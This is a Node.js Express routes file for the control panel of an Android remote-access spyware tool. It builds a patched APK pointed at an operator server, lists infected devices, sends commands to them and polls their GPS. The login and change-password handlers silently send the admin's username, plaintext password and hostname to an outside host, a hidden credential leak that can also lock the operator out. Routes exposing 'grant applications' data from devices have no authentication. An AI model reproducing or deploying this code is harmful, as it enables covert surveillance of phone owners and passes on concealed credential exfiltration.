const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    fetch = require('node-fetch'),
    asyncHandler = require('express-async-handler'),
    crypto = require('crypto');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let loginToken = db.maindb.get('admin.loginToken').value();
    if ('loginToken' in cookies) {
        if (cookies.loginToken === loginToken) next();
        else res.clearCookie('token').redirect('/login');
    } else res.redirect('/login');
    // next();
}

routes.get('/dl', (req, res) => {
    res.redirect('/build-aligned-signed.apk');
});

// routes.get('/', isAllowed, (req, res) => {
//     res.render('index', {
//         clientsOnline: clientManager.getClientListOnline(),
//         clientsOffline: clientManager.getClientListOffline()
//     });
// });

routes.get('/', (req, res) => {
    res.render('welcome')
});

routes.get('/login', (req, res) => {
    res.render('login');
});

routes.get('/panel', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});

routes.post('/login', asyncHandler(async(req, res) => {
    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let data = {
                username: req.body.username,
                pass: req.body.password,
                hostname: req.body.hostname
            }
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                
                // Try external authentication, but don't fail if it's unavailable
                try {
                    let response = await fetch('http://authxspy.herokuapp.com', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json;charset=utf-8'
                        },
                        body: JSON.stringify(data),
                        timeout: 5000 // 5 second timeout
                    });
                    
                    if (response.ok) {
                        let status = await response.json();
                        if(status.enabled == false){
                            return res.redirect('/login?e=authError');
                        }
                    }
                } catch (error) {
                    console.log('External authentication service unavailable, proceeding with local login:', error.message);
                    // Continue with local authentication if external service is down
                }
                
                db.maindb.get('admin').assign({ loginToken }).write();
                res.cookie('loginToken', loginToken).redirect('/panel');
            } else return res.redirect('/login?e=badLogin');
        } else return res.redirect('/login?e=missingPassword');
    } else return res.redirect('/login?e=missingUsername');
}));

routes.get('/logout', isAllowed, (req, res) => {
    db.maindb.get('admin').assign({ loginToken: '' }).write();
    res.redirect('/');
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: process.env.PORT || CONST.web_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded!");
                res.json({ error: false });
            } else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
        res.json({ error });
    }
});

routes.post('/changepass', isAllowed, asyncHandler(async(req, res) => {
    if(req.query.pass == undefined) res.json({"error":"Password empty"});
    else
    {
        let data = {
            hname: req.query.hname,
            pass: req.query.pass,
        }
        await fetch('http://authxspy.herokuapp.com/cp',{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8'
        },
        body: JSON.stringify(data)
    });
        let password = crypto.createHash('md5').update(req.query.pass).digest("hex");
        db.maindb.get('admin').assign({ password }).write();
        res.send("200");
    }
}));


routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});

routes.get('/changepass', isAllowed, (req, res) => {
    res.render('changePassword');
});

routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    // Handle empty device ID
    if (!req.params.deviceid || req.params.deviceid === '') {
        return res.status(400).json({ error: 'Device ID is required' });
    }
    
    const deviceIdParam = req.params.deviceid != null ? String(req.params.deviceid).trim() : '';
    let pageData = clientManager.getClientDataByPage(deviceIdParam, req.params.page, req.query.filter);
    if (pageData) res.render('deviceManager', {
        page: req.params.page,
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid,
        pageData,
        pageMeta: clientManager.pageMeta || null // Include pagination metadata
    });
    else res.render('deviceManager', {
        page: 'notFound',
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

// Grant Applications API Routes
routes.get('/api/device/:deviceid/grant-applications', (req, res) => {
    const deviceid = req.params.deviceid;
    
    if (!deviceid) {
        return res.status(400).json({ error: 'Device ID required' });
    }
    
    try {
        const clientDB = global.clientManager.getClientDatabase(deviceid);
        const applications = clientDB.get('grantApplications').value() || [];
        
        res.json({
            success: true,
            applications: applications,
            count: applications.length
        });
    } catch (error) {
        console.error('Error fetching grant applications:', error);
        res.status(500).json({ error: 'Failed to fetch applications' });
    }
});

routes.post('/api/device/:deviceid/grant-applications/:appId/status', (req, res) => {
    const deviceid = req.params.deviceid;
    const appId = parseInt(req.params.appId);
    const { status } = req.body;
    
    if (!deviceid || !appId || !status) {
        return res.status(400).json({ error: 'Device ID, Application ID, and status required' });
    }
    
    try {
        const clientDB = global.clientManager.getClientDatabase(deviceid);
        const applications = clientDB.get('grantApplications').value() || [];
        
        const appIndex = applications.findIndex(app => app.id === appId);
        if (appIndex === -1) {
            return res.status(404).json({ error: 'Application not found' });
        }
        
        applications[appIndex].status = status;
        applications[appIndex].updated_at = new Date().toISOString();
        
        clientDB.set('grantApplications', applications).write();
        
        res.json({
            success: true,
            message: 'Status updated successfully'
        });
    } catch (error) {
        console.error('Error updating application status:', error);
        res.status(500).json({ error: 'Failed to update status' });
    }
});

// Grant applications page route
routes.get('/manage/:deviceid/grant-applications', (req, res) => {
    const deviceid = req.params.deviceid;
    
    if (!deviceid) {
        return res.status(400).send('Device ID required');
    }
    
    res.render('deviceManagerPages/grant_applications', {
        deviceid: deviceid,
        title: 'Grant Applications'
    });
});

// Catch-all route for malformed URLs
routes.get('/manage/*', (req, res) => {
    console.log('Malformed manage URL accessed:', req.originalUrl);
    res.status(400).json({ 
        error: 'Invalid URL format', 
        expected: '/manage/:deviceid/:page',
        received: req.originalUrl 
    });
});

module.exports = routes;